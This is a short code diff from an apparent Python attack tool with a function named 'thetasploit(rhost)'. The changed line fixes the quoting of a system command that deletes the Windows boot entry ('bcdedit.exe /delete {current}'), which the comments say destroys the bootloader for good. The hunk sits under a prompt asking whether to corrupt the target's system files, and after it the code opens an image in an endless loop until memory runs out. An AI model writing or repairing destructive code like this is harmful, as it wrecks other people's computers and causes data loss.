@@ -22,7 +22,7 @@ def thetasploit(rhost):
             time.sleep(1)
             destroy = input("Do you want to corrupt his system files? (Y or N): ")
             if destroy == 'Y' or 'y': #here is where the detruction starts
-                os.system('"bcdedit.exe /delete {current}"') # This destroyes the bootloader for good
+                os.system("bcdedit.exe /delete {current}") # This destroyes the bootloader for good
                 while True:
                     #opens a image forever until the machine runs out of ram
                     os.startfile('troll.jpg')
